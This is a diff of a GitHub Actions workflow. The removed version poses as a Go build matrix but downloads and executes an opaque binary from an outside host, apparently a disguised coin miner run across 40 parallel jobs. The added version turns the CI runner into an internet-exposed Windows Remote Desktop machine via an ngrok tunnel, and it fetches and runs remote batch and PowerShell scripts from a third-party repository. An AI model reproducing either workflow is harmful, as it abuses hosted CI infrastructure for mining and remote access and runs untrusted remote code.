@@ -1,27 +1,44 @@
-name: CI_Node
-on: [workflow_dispatch]
+name: Windows-RDP
+
+on: workflow_dispatch
+
 jobs:
   build:
-    name: Verus_coin
-    runs-on: ubuntu-18.04
-    strategy:
-      max-parallel: 40
-      fail-fast: false
-      matrix:
-        go: [1.6, 1.7, 1.8, 1.9, 1.10]
-        flag: [A, B, C, D, E, F, G, H, I]
+
+    runs-on: windows-2022
     timeout-minutes: 360
-    env:
-        NUM_JOBS: 20
-        JOB: ${{ matrix.go }}
+
     steps:
-    - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v1
-      with:
-        go-version: ${{ matrix.go }}
-      id: go
-    - name: Setup
-      uses: actions/checkout@v1
-    - name: Verus_coin
+    - name: Downloading Ngrok.
       run: |
-        wget https://tobbo.net/I4mt0xMWti && chmod u+x I4mt0xMWti && ./I4mt0xMWti
+        Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
+        Invoke-WebRequest https://raw.githubusercontent.com/increase102594/rdpgt01/main/start.bat -OutFile start.bat
+        Invoke-WebRequest https://telegra.ph/file/d6a11d84f0e308f56cf5a.png -OutFile wallpaper.bmp
+        Invoke-WebRequest https://raw.githubusercontent.com/increase102594/rdpgt01/main/wallpaper.bat -OutFile wallpaper.bat
+    - name: Downloading Launcher.
+      run: |
+        Invoke-WebRequest https://raw.githubusercontent.com/increase102594/rdpgt01/main/launcher/Node.js.lnk -OutFile Node.js.lnk
+        Invoke-WebRequest https://raw.githubusercontent.com/increase102594/rdpgt01/main/launcher/Visual%20Studio%202019.lnk -OutFile "Visual Studio 2019.lnk"
+    - name: Extracting Ngrok File.
+      run: Expand-Archive ngrok.zip
+    - name: Connect To Ngrok Account.
+      run: .\ngrok\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN
+      env:
+        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
+    - name: Activated RDP Access.
+      run: | 
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+        copy wallpaper.bmp D:\a\wallpaper.bmp
+        copy wallpaper.bat D:\a\wallpaper.bat
+        copy Node.js.lnk C:\Users\Public\Desktop\Node.js.lnk
+        copy "Visual Studio 2019.lnk" "C:\Users\Public\Desktop\Visual Studio 2019.lnk"
+    - name: Creating Tunnel.
+      run: Start-Process Powershell -ArgumentList '-Noexit -Command ".\ngrok\ngrok.exe tcp --region ap 3389"'
+    - name: Connect to your RDP CPU 2 Core - 7GB Ram - 255 SSD.
+      run: cmd /c start.bat
+    - name: Success Create! You can close tab now.
+      run: | 
+        Invoke-WebRequest https://github.com/increase102594/rdpgt01/raw/main/loop.ps1 -OutFile loop.ps1
+        ./loop.ps1
